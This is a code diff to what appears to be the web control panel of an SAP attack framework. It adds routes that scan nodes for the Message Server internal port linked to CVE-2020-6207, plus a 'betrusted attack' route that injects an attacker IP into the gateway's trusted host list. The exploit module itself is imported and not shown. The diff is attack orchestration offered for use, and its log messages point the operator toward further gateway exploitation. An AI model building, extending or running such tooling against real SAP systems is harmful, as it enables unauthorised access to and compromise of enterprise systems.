@@ -1124,6 +1124,74 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_gw", "Check Gateway", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/check_ms", method="POST")
+    def node_check_ms(sid):
+        """Check MS internal port for CVE-2020-6207 (betrusted vulnerability)."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            print(f"[*] {sid}: Checking MS internal port (CVE-2020-6207 / betrusted)...")
+            found = sapmap_scanner.check_ms_betrusted(node)
+            if not found:
+                print(f"[*] {sid}: MS internal port not found/reachable")
+            elif node.ms_vulnerable:
+                print(f"[+] {sid}: MS port {node.ms_port} VULNERABLE — betrusted attack possible!")
+            elif node.ms_acl_protected:
+                print(f"[~] {sid}: MS port {node.ms_port} reachable but ACL-protected")
+
+        _bg(f"{sid}:check_ms", "Check MS Betrusted", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/betrusted", method="POST")
+    def node_betrusted(sid):
+        """Execute betrusted attack: inject attacker IP into gateway trusted host list."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        attacker_ip = data.get("attacker_ip", "").strip()
+        if not attacker_ip:
+            return json.dumps({"error": "attacker_ip is required"})
+
+        if not node.ms_port:
+            return json.dumps({"error": "MS internal port not known — run Check MS first"})
+
+        nilist_wait = float(data.get("nilist_wait", 30.0))
+        dp_version  = int(data.get("dp_version", 13))
+        kernel_new  = bool(data.get("kernel_new", True))
+
+        def _run():
+            try:
+                from sap_ms_betrusted import betrusted
+            except ImportError:
+                print(f"[-] sap_ms_betrusted not available")
+                return
+
+            host = node.ip or node.hostname
+            print(f"[*] {sid}: Running betrusted attack on {host}:{node.ms_port} "
+                  f"→ injecting {attacker_ip} into gateway trust list")
+            result = betrusted(
+                host=host,
+                port=node.ms_port,
+                attacker_ip=attacker_ip,
+                nilist_wait=nilist_wait,
+                dp_version=dp_version,
+                kernel_new=kernel_new,
+            )
+            if result["success"]:
+                print(f"[+] {sid}: betrusted completed — {attacker_ip} should be trusted by gateway")
+                print(f"[*] {sid}: Now check GW vulnerability from {attacker_ip}")
+            else:
+                print(f"[-] {sid}: betrusted failed: {result['error']}")
+
+        _bg(f"{sid}:betrusted", "Betrusted Attack", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/create_user", method="POST")
     def node_create_user(sid):
         response.content_type = "application/json"
@@ -2516,6 +2584,20 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 sapmap_exploit.check_gw_vulnerable(node)
 
         _bg("_check_all_gw", "Check All GW Vulnerabilities", _run)
+        return json.dumps({"status": "started", "systems": len(nodes)})
+
+    @app.route("/api/actions/check_all_ms", method="POST")
+    def actions_check_all_ms():
+        """Check MS internal port (CVE-2020-6207) on all nodes."""
+        response.content_type = "application/json"
+        nodes = list(api.state.nodes.values())
+
+        def _run():
+            for node in nodes:
+                print(f"[*] Checking MS betrusted: {node.sid} ({node.ip})")
+                sapmap_scanner.check_ms_betrusted(node)
+
+        _bg("_check_all_ms", "Check All MS Betrusted", _run)
         return json.dumps({"status": "started", "systems": len(nodes)})
 
     @app.route("/api/actions/reset_rfc_cache", method="POST")
